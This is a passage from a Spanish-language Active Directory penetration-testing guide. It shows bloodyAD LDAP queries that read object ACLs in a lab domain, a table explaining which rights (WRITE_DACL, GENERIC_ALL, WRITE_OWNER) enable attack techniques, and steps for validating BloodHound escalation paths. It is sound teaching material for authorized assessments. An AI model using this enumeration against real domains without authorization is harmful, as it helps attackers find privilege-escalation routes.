bloodyAD --host 192.0.2.10 -d lab.example -u operador -p 'Password123!' \
  get search --filter "(objectClass=domain)" --base "DC=lab,DC=example" \
  --attr nTSecurityDescriptor --resolve-sd
```

Esta consulta permite comprobar las ACE aplicadas a la raíz del dominio. Que el nombre de un usuario o grupo aparezca en la salida significa que actúa como *trustee* de una ACE sobre ese objeto; no demuestra que posea el mismo permiso sobre todos los objetos del directorio.

#### Consultar la ACL de un objeto objetivo

Para validar una relación sobre un usuario, grupo, equipo u otro objeto, ajustamos el filtro para seleccionar ese objetivo concreto.

```bash
bloodyAD --host <IP_DC> -d <DOMINIO> -u <USUARIO> -p '<CONTRASEÑA>' \
  get search --filter "(&(objectClass=<CLASE>)(sAMAccountName=<OBJETIVO>))" \
  --base "<BASE_DN>" --attr distinguishedName,nTSecurityDescriptor --resolve-sd
```

Ejemplo sobre un grupo:

```bash
bloodyAD --host 192.0.2.10 -d lab.example -u operador -p 'Password123!' \
  get search --filter "(&(objectClass=group)(sAMAccountName=Soporte-TI))" \
  --base "DC=lab,DC=example" \
  --attr distinguishedName,nTSecurityDescriptor --resolve-sd
```

Ejemplo sobre un usuario:

```bash
bloodyAD --host 192.0.2.10 -d lab.example -u operador -p 'Password123!' \
  get search --filter "(&(objectClass=user)(sAMAccountName=usuario.objetivo))" \
  --base "DC=lab,DC=example" \
  --attr distinguishedName,nTSecurityDescriptor --resolve-sd
```

Incluir `distinguishedName` en la salida ayuda a confirmar que estamos inspeccionando el objeto correcto, especialmente cuando existen nombres similares.

#### Filtrar por el principal que controlamos

Una vez comprobado el objeto objetivo, podemos reducir la salida buscando el usuario o grupo que BloodHound señaló como origen de la relación:

```bash
bloodyAD --host <IP_DC> -d <DOMINIO> -u <USUARIO> -p '<CONTRASEÑA>' \
  get search --filter "(&(objectClass=<CLASE>)(sAMAccountName=<OBJETIVO>))" \
  --base "<BASE_DN>" --attr distinguishedName,nTSecurityDescriptor --resolve-sd \
  | grep -B1 -A4 '<PRINCIPAL_CONTROLADO>'
```

El filtrado sirve para localizar una ACE dentro de una salida extensa, pero debemos revisar también las líneas contiguas para no separar el `Trustee`, el `Right`, el `ObjectType`, las condiciones de herencia y si la entrada permite o deniega el acceso.

Una salida puede presentar una estructura similar a la siguiente:

```text
nTSecurityDescriptor.ACL.3.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.3.Trustee: LAB\operador
nTSecurityDescriptor.ACL.3.Right: WRITE_DACL
nTSecurityDescriptor.ACL.3.ObjectType: Self
```

En la salida de `bloodyAD`, `Self` se refiere al objeto cuyo descriptor estamos consultando. En este ejemplo, `operador` posee `WRITE_DACL` sobre el objeto objetivo devuelto por la consulta; no significa que el permiso se aplique sobre su propia cuenta.

#### Interpretar los permisos principales

| Derecho observado | Interpretación sobre el objeto objetivo | Posible relevancia |
| --- | --- | --- |
| `GENERIC_READ` o `READ_PROP` | Permite leer el objeto o determinados atributos. | Puede revelar información sensible, aunque no implica modificación directa. |
| `WRITE_PROP` | Permite modificar una propiedad o conjunto de propiedades indicado por `ObjectType`. | Su efecto depende del atributo concreto, como membresías, SPN o propiedades de delegación. |
| `GENERIC_WRITE` | Agrupa varios permisos de escritura sobre el objetivo. | Puede habilitar técnicas diferentes según se trate de un usuario, grupo, equipo, OU o GPO. |
| `GENERIC_ALL` | Concede control amplio sobre el objeto. | Puede permitir modificar atributos, membresías o credenciales según el tipo de objetivo. |
| `WRITE_DACL` | Permite modificar la DACL del objeto. | Puede utilizarse para conceder a otra identidad un permiso adicional sobre ese objetivo. |
| `WRITE_OWNER` | Permite asumir la propiedad del objeto. | Ser propietario puede facilitar posteriormente la modificación de su DACL. |
| `CONTROL_ACCESS` | Representa un derecho extendido definido por `ObjectType`. | Debe interpretarse junto con el derecho concreto, por ejemplo replicación o restauración de objetos. |
| `CONTROL_ACCESS` + `Reanimate-Tombstones` | Concede el derecho extendido para restaurar objetos eliminados dentro del contexto de nombres al que se aplica la ACE. | Puede permitir recuperar un objeto eliminado si todavía conserva un estado restaurable; no concede automáticamente acceso de lectura a todos sus atributos. |
| `== DENIED ==` | La ACE deniega explícitamente el acceso indicado. | Obliga a revisar el acceso efectivo, el orden de las ACE y la pertenencia a grupos. |

Los permisos efectivos también pueden proceder de grupos anidados o de ACE heredadas. Por ello, una coincidencia de texto no basta para afirmar que una técnica funcionará.

#### Validar la relación completa

Antes de continuar debemos poder expresar y confirmar la relación completa:

```text
operador → WriteDACL → grupo Soporte-TI
```

Para darla por válida comprobamos:

1. Que controlamos realmente el principal de origen.
2. Que la consulta devuelve exactamente el objeto objetivo esperado.
3. Que la ACE permite el derecho y no es únicamente una entrada de auditoría o denegación.
4. Que `ObjectType` y las condiciones de herencia hacen aplicable el permiso al objetivo.
5. Que la acción derivada está dentro del alcance de la evaluación.

Solo después elegimos una técnica compatible con el tipo de objeto y el permiso confirmado. Esto evita interpretar una relación de BloodHound como una capacidad automática de explotación.

### 7.9. Volver a recopilar cuando cambie el acceso

Las ACL y membresías suelen cambiar con poca frecuencia, pero las sesiones de usuario son dinámicas. Además, una cuenta nueva puede permitir recopilar información que la identidad anterior no podía consultar.

Debemos repetir o complementar la recopilación cuando:

- Recuperemos otra credencial.
- Comprometamos un equipo adicional.
- Necesitemos actualizar sesiones.
- Accedamos a otro dominio mediante un trust.
- Detectemos que faltan relaciones necesarias para validar una hipótesis.

Cada ZIP debe conservarse con una fecha y la identidad utilizada para poder distinguir recopilaciones y evitar analizar datos antiguos como si fueran actuales.

**Resultado de la fase:** ZIP de recopilación, objetos `Owned` correctamente marcados y rutas potenciales validadas manualmente.

---

## Descargar los comandos de la metodología

Ahora que conocemos el propósito de cada fase, podemos descargar el siguiente archivo `.md` como referencia rápida con los comandos organizados y sin explicaciones.

<a href="https://drive.google.com/file/d/1VHZ0D5QeagSTP1LZzfizrfs9tJkuzgfd/view?usp=sharing" target="_blank" rel="noopener noreferrer">
  Abrir y descargar los comandos de Active Directory (.md)
</a>
